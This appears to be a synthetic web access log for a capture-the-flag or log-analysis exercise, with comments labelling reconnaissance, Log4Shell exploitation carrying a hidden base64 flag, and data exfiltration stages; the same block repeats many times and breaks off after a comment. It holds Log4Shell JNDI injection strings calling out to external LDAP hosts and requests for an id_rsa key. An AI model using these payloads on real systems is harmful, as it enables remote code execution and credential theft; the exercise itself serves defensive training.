45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
104.248.140.21 - - [01/Nov/2025:10:15:30 +0000] "GET /backups/classified_backup.zip HTTP/1.1" 200 55000000 "-" "Wget/1.20.3 (linux-gnu)"
104.248.140.21 - - [01/Nov/2025:10:15:35 +0000] "GET /admin/config/id_rsa HTTP/1.1" 200 1675 "-" "Wget/1.20.3 (linux-gnu)"


192.168.1.1 - - [01/Nov/2025:10:00:01 +0000] "GET / HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.2 - - [01/Nov/2025:10:00:03 +0000] "GET /login HTTP/1.1" 200 800 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
192.168.1.1 - - [01/Nov/2025:10:00:05 +0000] "POST /login HTTP/1.1" 200 1200 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
192.168.1.3 - - [01/Nov/2025:10:01:10 +0000] "GET /products HTTP/1.1" 200 3500 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"

# --- Stage 1: Reconnaissance (Attacker 1) ---
45.55.199.155 - - [01/Nov/2025:10:05:01 +0000] "GET / HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:02 +0000] "GET /robots.txt HTTP/1.1" 404 150 "-" "nmap"
45.55.199.155 - - [01/Nov/2025:10:05:03 +0000] "GET /admin HTTP/1.1" 404 150 "-" "Nmap Scripting Engine; "
45.55.199.155 - - [01/Nov/2025:10:05:04 +0000] "GET /.git/config HTTP/1.1" 404 150 "-" "nmap"

192.168.1.2 - - [01/Nov/2025:10:06:00 +0000] "GET /dashboard HTTP/1.1" 200 2200 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"

# --- Stage 2: Log4Shell Exploitation (Attacker 2) & HIDDEN FLAG ---
# This IP (167.99.196.188, DigitalOcean, DE) will trigger CTI
167.99.196.188 - - [01/Nov/2025:10:10:15 +0000] "GET /search?q=${jndi:ldap://167.99.196.188:1389/ZmxhZ3t0aDFzX2lzX3RoM19oMWRkM25fbDBnNHNoM2xsX2ZsNGd9} HTTP/1.1" 400 500 "-" "curl/7.64.1"
167.99.196.188 - - [01/Nov/2025:10:10:16 +0000] "GET /api/user?id=${jndi:ldap://bad-guy.com/exploit} HTTP/1.1" 400 500 "-" "python-requests/2.25.1"
167.99.196.188 - - [01/Nov/2025:10:10:18 +0000] "POST /login HTTP/1.1" 400 500 "user=${jndi" "Mozilla/5.0"

192.168.1.5 - - [01/Nov/2025:10:11:00 +0000] "GET /images/logo.png HTTP/1.1" 200 4500 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# --- Stage 3: Exfiltration (Attacker 3) ---
# This IP (104.248.140.21, Contabo, US) has a high AbuseIPDB score
